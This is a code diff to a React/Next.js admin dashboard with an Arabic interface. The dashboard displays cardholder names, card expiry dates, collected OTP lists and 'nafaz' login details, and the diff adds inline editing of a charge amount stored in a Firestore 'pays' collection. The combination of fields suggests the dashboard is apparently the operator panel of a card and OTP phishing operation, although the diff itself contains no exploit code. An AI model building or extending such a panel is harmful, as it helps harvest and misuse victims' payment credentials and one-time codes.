@@ -207,7 +207,7 @@ function CardInfoCard({ notification }: { notification: Notification }) {
                   <span className="font-bold text-base text-gray-800">{notification.cardHolderName}</span>
                 </div>
               )}
-              {notification?.expiryDate && (
+              {notification.expiryDate && (
                 <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                   <span className="text-xs font-medium text-gray-600">تاريخ الانتهاء</span>
                   <span className="font-bold text-base text-gray-800 font-mono">{notification?.expiryDate}</span>
@@ -296,6 +296,9 @@ export default function NotificationsPage() {
   const [searchTerm, setSearchTerm] = useState("")
   const [currentPage, setCurrentPage] = useState(1)
   const [itemsPerPage] = useState(10)
+  const [editingAmountId, setEditingAmountId] = useState<string | null>(null)
+  const [editingAmountValue, setEditingAmountValue] = useState("")
+  const [isUpdatingAmount, setIsUpdatingAmount] = useState(false)
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
   const { toast } = useToast()
@@ -446,6 +449,49 @@ export default function NotificationsPage() {
         variant: "destructive",
       })
     }
+  }
+
+  const handleAmountUpdate = async (id: string, newAmount: string) => {
+    setIsUpdatingAmount(true)
+    try {
+      const docRef = doc(db, "pays", id)
+      await updateDoc(docRef, {
+        amount: newAmount,
+      })
+
+      setNotifications(
+        notifications.map((notification) =>
+          notification.id === id ? { ...notification, amount: newAmount } : notification,
+        ),
+      )
+
+      setEditingAmountId(null)
+      setEditingAmountValue("")
+
+      toast({
+        title: "تم التحديث بنجاح",
+        description: "تم تحديث المبلغ بنجاح",
+      })
+    } catch (error) {
+      console.error("Error updating amount:", error)
+      toast({
+        title: "خطأ في التحديث",
+        description: "حدث خطأ أثناء تحديث المبلغ",
+        variant: "destructive",
+      })
+    } finally {
+      setIsUpdatingAmount(false)
+    }
+  }
+
+  const startEditingAmount = (id: string, currentAmount: string) => {
+    setEditingAmountId(id)
+    setEditingAmountValue(currentAmount || "")
+  }
+
+  const cancelEditingAmount = () => {
+    setEditingAmountId(null)
+    setEditingAmountValue("")
   }
 
   const handleInfoClick = (notification: Notification, type: "personal" | "card" | "nafaz") => {
@@ -605,7 +651,41 @@ export default function NotificationsPage() {
                             }`}
                           ></div>
                           <div>
-                            <p className="font-semibold text-gray-800">{notification.amount || "غير متوفر"}</p>
+                            {editingAmountId === notification.id ? (
+                              <div className="flex items-center gap-2">
+                                <Input
+                                  value={editingAmountValue}
+                                  onChange={(e) => setEditingAmountValue(e.target.value)}
+                                  className="h-8 w-32"
+                                  placeholder="المبلغ"
+                                  disabled={isUpdatingAmount}
+                                />
+                                <Button
+                                  size="sm"
+                                  onClick={() => handleAmountUpdate(notification.id, editingAmountValue)}
+                                  disabled={isUpdatingAmount}
+                                  className="h-8 px-2"
+                                >
+                                  {isUpdatingAmount ? <Loader2 className="h-4 w-4 animate-spin" /> : "حفظ"}
+                                </Button>
+                                <Button
+                                  size="sm"
+                                  variant="outline"
+                                  onClick={cancelEditingAmount}
+                                  disabled={isUpdatingAmount}
+                                  className="h-8 px-2 bg-transparent"
+                                >
+                                  إلغاء
+                                </Button>
+                              </div>
+                            ) : (
+                              <p
+                                className="font-semibold text-gray-800 cursor-pointer hover:text-blue-600"
+                                onClick={() => startEditingAmount(notification.id, notification.amount)}
+                              >
+                                {notification.amount || "غير متوفر"}
+                              </p>
+                            )}
                             <p className="text-sm text-gray-500">{notification.email || notification.billNumber}</p>
                             {notification.createdDate && (
                               <p className="text-xs text-gray-400">
@@ -674,7 +754,6 @@ export default function NotificationsPage() {
                         <Button className="mx-1 h-8" variant={"destructive"} size={"icon"}>
                           <Delete className="h-4" />
                         </Button>
-                        {notification.allOtps&& <Badge>{notification.allOtps.length+1}</Badge>}
                       </td>
                     </tr>
                   ))}
